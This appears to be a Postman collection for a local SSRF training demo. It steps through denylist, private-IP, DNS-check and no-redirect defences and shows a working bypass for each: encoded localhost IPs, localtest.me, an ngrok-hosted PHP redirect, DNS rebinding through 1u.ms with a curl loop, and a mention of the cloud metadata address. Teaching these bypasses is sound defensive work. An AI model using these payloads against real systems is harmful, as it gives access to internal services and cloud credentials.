@@ -1,0 +1,149 @@
+{
+	"info": {
+		"_postman_id": "5c21162e-49f1-45d3-a9d4-599a914d0044",
+		"name": "SSRF-Demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "10499635"
+	},
+	"item": [
+		{
+			"name": "nodefense",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{url}}/nodefense?url=http://127.0.0.1:8000/index.html",
+					"host": [
+						"{{url}}"
+					],
+					"path": [
+						"nodefense"
+					],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://127.0.0.1:8000/index.html"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "defense1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{url}}/defense1?url=http://0x7f.0x0.0x0.0x1:8000/index.html",
+					"host": [
+						"{{url}}"
+					],
+					"path": [
+						"defense1"
+					],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://0x7f.0x0.0x0.0x1:8000/index.html",
+							"description": "http://0x7f.0x0.0x0.0x1 - Hex encoding the localhost address should bypass this defense"
+						}
+					]
+				},
+				"description": "**Defense**: The simplest solution used by developer to defend against SSRF attacks is evaluating an hostname/IP address against a denylist. In this method, hostname is matched against a denylist or a simple regEx check to ensure that it does not point to an internal service.\n\n**Bypass**: The defense solution is bypassed by using different encoding schemes. (e.g., decimal-encoded version of 127.0.0.1 is 2130706433) and IPv6.\n\n| **Encoding Formats** | **localhost IP** | **Encoded IPs** |\n| --- | --- | --- |\n| Decimal encoding  <br> | 127.0.0.1 | 2130706433  <br> |\n| Hex Encoding  <br> | 127.0.0.1 | 0x7f.0x0.0x0.0x1  <br> |\n| Octal Encoding  <br> | 127.0.0.1 | 0177.0.0.01  <br> |\n| Binary  <br> | 127.0.0.1 | 10101001111111101010100111111110  <br> |\n| Mixed Encoding  <br> | 127.0.0.1 | 0177.0.0.0x1  <br> |"
+			},
+			"response": []
+		},
+		{
+			"name": "defense2",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{url}}/defense2?url=http://localtest.me:8000/index.html",
+					"host": [
+						"{{url}}"
+					],
+					"path": [
+						"defense2"
+					],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://localtest.me:8000/index.html",
+							"description": "localtest.me domain resolve to 127.0.0.1, resulting in effectivly bypassing the defense"
+						}
+					]
+				},
+				"description": "**Defense**: To avoid the limitations of blacklisting, some developers rely on libraries to disallow a URL which has a private IP address as its hostname. However, this solution is not resilient against DNS pinning \n\n  \n**Bypass**:\n\n- An attacker can use a hostname that resolves to a private IP (e.g., [http://localtest.me:123/data](http://localtest.me:123/data) where localtest.me resolves to 127.0.0.1) to bypass the defense. It can be used by an attacker to bind a legit domain name to an internal IP address.\n    \n\n- define A or AAAA records on your DNS server to your subdomains into victim’s intranet.\n    \n\nhttp://test2.pstmn-stage.io -> http://169.254.169.254"
+			},
+			"response": []
+		},
+		{
+			"name": "defense3",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{url}}/defense3?url=https://3f08-49-43-100-64.ngrok-free.app/redirect.php",
+					"host": [
+						"{{url}}"
+					],
+					"path": [
+						"defense3"
+					],
+					"query": [
+						{
+							"key": "url",
+							"value": "https://3f08-49-43-100-64.ngrok-free.app/redirect.php"
+						}
+					]
+				},
+				"description": "**Defence**: Now, to mitigate the DNS pinning issue, developers can check if the hostname resolves to a private IP address by making a DNS query\n\n**Bypass**:  This mitigation can be defeated by using HTTP Redirection Bypass Technique.\n\n**The Technique**:\n\nCraft a PHP redirect file in a manner that, upon execution, redirects the traffic to the internal server instead of the intended destination. This method ensures that when the targeted server resolves the URL, it redirects to the internal server, effectively circumventing any mitigation measures.\n\n``` php\n\theader('Location: http://127.0.0.1:8000/index.html');\n?>\n\n```\n\nUse [ngrok](https://ngrok.com/) to host this redirect.php file. The final Payload should look like this:\n\n`https://3c5c-49-43-100-139.ngrok-free.app/redirect.php`"
+			},
+			"response": []
+		},
+		{
+			"name": "defense4",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"pm.test(\"Status code is 200\", function () {",
+							"    pm.response.to.have.status(200);",
+							"});"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{url}}/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html",
+					"host": [
+						"{{url}}"
+					],
+					"path": [
+						"defense4"
+					],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html"
+						},
+						{
+							"key": "url",
+							"value": "http://make-127.0.0.1-rebind-66.96.146.129-rr.1u.ms:8000/index.html",
+							"disabled": true
+						}
+					]
+				},
+				"description": "Defense: To prevent HTTP redirection bypass, developers disable redirection in requests made from the application to the Internet\n\n**Bypass**: HTTP rebinding techique to bypass the defense\n\n- Two DNS requests are made before an HTTP request is made to a target URL:\n    - Request 1: to check whether the host is pointing to a private IP address,\n    - Request 2: resolve the hostname to start a connection to the target server.\n- Attackers take advantage of this by providing a URL pointing to their own server and have their DNS server serve two different DNS responses.\n    - First Response: a public IP address to pass the first check,\n    - Second Response: A private IP address to achieve a request forgery to an internal service.\n\nYou can leverage: [http://1u.ms](http://1u.ms) to generate the Low TTL DNS that resolves to 2 different IP addresses when quried at 2 different times.\n\n``` bash\nfor ((i=1;i<=100;i++)); do curl --location '127.0.0.1:3000/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html'; done\n\n\n```"
+			},
+			"response": []
+		}
+	]
+}
